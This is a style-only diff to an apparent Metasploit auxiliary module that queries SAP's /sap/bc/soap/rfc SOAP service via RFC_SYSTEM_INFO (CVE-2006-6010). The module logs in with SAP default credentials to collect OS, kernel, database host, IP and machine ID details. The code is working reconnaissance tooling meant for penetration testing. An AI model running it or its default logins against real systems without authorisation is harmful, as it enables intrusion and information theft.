@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -17,7 +18,6 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::Scanner
@@ -25,11 +25,11 @@ class MetasploitModule < Msf::Auxiliary
   def initialize
     super(
       'Name' => 'SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering',
-      'Description' => %q{
+      'Description' => %q(
         This module makes use of the RFC_SYSTEM_INFO Function to obtain the operating
         system version, SAP version, IP address and other information through the use of
         the /sap/bc/soap/rfc SOAP service.
-      },
+      ),
       'References' =>
         [
           [ 'CVE', '2006-6010' ],
@@ -48,26 +48,25 @@ class MetasploitModule < Msf::Auxiliary
         Opt::RPORT(8000),
         OptString.new('CLIENT', [true, 'SAP Client ', '001']),
         OptString.new('HttpUsername', [true, 'Username', 'SAP*']),
-        OptString.new('HttpPassword', [true, 'Password', '06071992']),
-      ], self.class)
+        OptString.new('HttpPassword', [true, 'Password', '06071992'])
+      ], self.class
+    )
   end
 
   def extract_field(data, elem)
-    if data =~ /<#{elem}>([^<]+)<\/#{elem}>/i
-      return $1
-    end
+    return Regexp.last_match(1) if data =~ /<#{elem}>([^<]+)<\/#{elem}>/i
     nil
   end
 
   def report_note_sap(type, data, value)
     # create note
     report_note(
-      :host => rhost,
-      :port => rport,
-      :proto => 'tcp',
-      :sname => 'sap',
-      :type => type,
-      :data => data + value
+      host: rhost,
+      port: rport,
+      proto: 'tcp',
+      sname: 'sap',
+      type: type,
+      data: data + value
     ) if data
     # update saptbl for output
     @saptbl << [ data, value ]
@@ -88,27 +87,25 @@ class MetasploitModule < Msf::Auxiliary
     data << '</env:Envelope>'
     print_status("[SAP] #{ip}:#{rport} - sending SOAP RFC_SYSTEM_INFO request")
     begin
-      res = send_request_cgi({
-        'uri' => '/sap/bc/soap/rfc',
-        'method' => 'POST',
-        'data' => data,
-        'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
-        'ctype' => 'text/xml; charset=UTF-8',
-        'encode_params' => false,
-        'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
-        'headers' =>{
-          'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions',
-        },
-        'vars_get' => {
-          'sap-client'    => datastore['CLIENT'],
-          'sap-language'  => 'EN'
-        }
-      })
-      if res and res.code != 500 and res.code != 200
+      res = send_request_cgi('uri' => '/sap/bc/soap/rfc',
+                             'method' => 'POST',
+                             'data' => data,
+                             'cookie' => "sap-usercontext=sap-language=EN&sap-client=#{datastore['CLIENT']}",
+                             'ctype' => 'text/xml; charset=UTF-8',
+                             'encode_params' => false,
+                             'authorization' => basic_auth(datastore['HttpUsername'], datastore['HttpPassword']),
+                             'headers' => {
+                               'SOAPAction' => 'urn:sap-com:document:sap:rfc:functions'
+                             },
+                             'vars_get' => {
+                               'sap-client' => datastore['CLIENT'],
+                               'sap-language' => 'EN'
+                             })
+      if res && (res.code != 500) && (res.code != 200)
         # to do - implement error handlers for each status code, 404, 301, etc.
         print_error("[SAP] #{ip}:#{rport} - something went wrong!")
         return
-      elsif not res
+      elsif !res
         print_error("[SAP] #{ip}:#{rport} - Server did not respond")
         return
       end
@@ -126,7 +123,7 @@ class MetasploitModule < Msf::Auxiliary
       'Prefix' => "\n",
       'Postfix' => "\n",
       'Indent' => 1,
-      'Columns' =>[ "Key", "Value" ]
+      'Columns' => [ "Key", "Value" ]
     )
 
     response = res.body
@@ -151,36 +148,35 @@ class MetasploitModule < Msf::Auxiliary
     rfcipv6addr = extract_field(response, 'rfcipv6addr')
 
     # report notes / create saptbl output
-    report_note_sap('sap.version.release','Release Status of SAP System: ',rfcsaprl) if rfcsaprl
-    report_note_sap('sap.version.rfc_log','RFC Log Version: ',rfcproto) if rfcproto
-    report_note_sap('sap.version.kernel','Kernel Release: ',rfckernrl) if rfckernrl
-    report_note_sap('system.os','Operating System: ',rfcopsys) if rfcopsys
-    report_note_sap('sap.db.hostname','Database Host: ',rfcdbhost) if rfcdbhost
-    report_note_sap('sap.db_system','Central Database System: ',rfcdbsys) if rfcdbsys
-    report_note_sap('system.hostname','Hostname: ',rfchost) if rfchost
-    report_note_sap('system.ip.v4','IPv4 Address: ',rfcipaddr) if rfcipaddr
-    report_note_sap('system.ip.v6','IPv6 Address: ',rfcipv6addr) if rfcipv6addr
-    report_note_sap('sap.instance','System ID: ',rfcsysid) if rfcsysid
-    report_note_sap('sap.rfc.destination','RFC Destination: ',rfcdest) if rfcdest
-    report_note_sap('system.timezone','Timezone (diff from UTC in seconds): ',rfctzone.gsub(/\s+/, "")) if rfctzone
-    report_note_sap('system.charset','Character Set: ',rfcchartyp) if rfcchartyp
-    report_note_sap('sap.daylight_saving_time','Daylight Saving Time: ',rfcdayst) if rfcdayst
-    report_note_sap('sap.machine_id','Machine ID: ',rfcmach.gsub(/\s+/,"")) if rfcmach
+    report_note_sap('sap.version.release', 'Release Status of SAP System: ', rfcsaprl) if rfcsaprl
+    report_note_sap('sap.version.rfc_log', 'RFC Log Version: ', rfcproto) if rfcproto
+    report_note_sap('sap.version.kernel', 'Kernel Release: ', rfckernrl) if rfckernrl
+    report_note_sap('system.os', 'Operating System: ', rfcopsys) if rfcopsys
+    report_note_sap('sap.db.hostname', 'Database Host: ', rfcdbhost) if rfcdbhost
+    report_note_sap('sap.db_system', 'Central Database System: ', rfcdbsys) if rfcdbsys
+    report_note_sap('system.hostname', 'Hostname: ', rfchost) if rfchost
+    report_note_sap('system.ip.v4', 'IPv4 Address: ', rfcipaddr) if rfcipaddr
+    report_note_sap('system.ip.v6', 'IPv6 Address: ', rfcipv6addr) if rfcipv6addr
+    report_note_sap('sap.instance', 'System ID: ', rfcsysid) if rfcsysid
+    report_note_sap('sap.rfc.destination', 'RFC Destination: ', rfcdest) if rfcdest
+    report_note_sap('system.timezone', 'Timezone (diff from UTC in seconds): ', rfctzone.gsub(/\s+/, "")) if rfctzone
+    report_note_sap('system.charset', 'Character Set: ', rfcchartyp) if rfcchartyp
+    report_note_sap('sap.daylight_saving_time', 'Daylight Saving Time: ', rfcdayst) if rfcdayst
+    report_note_sap('sap.machine_id', 'Machine ID: ', rfcmach.gsub(/\s+/, "")) if rfcmach
 
     if rfcinttyp == 'LIT'
-      report_note_sap('system.endianness','Integer Format: ', 'Little Endian')
+      report_note_sap('system.endianness', 'Integer Format: ', 'Little Endian')
     elsif rfcinttyp
-      report_note_sap('system.endianness','Integer Format: ', 'Big Endian')
+      report_note_sap('system.endianness', 'Integer Format: ', 'Big Endian')
     end
 
     if rfcflotyp == 'IE3'
-      report_note_sap('system.float_type','Float Type Format: ', 'IEEE')
+      report_note_sap('system.float_type', 'Float Type Format: ', 'IEEE')
     elsif rfcflotyp
-      report_note_sap('system.float_type','Float Type Format: ', 'IBM/370')
+      report_note_sap('system.float_type', 'Float Type Format: ', 'IBM/370')
     end
 
     # output table
     print(@saptbl.to_s)
-
   end
 end
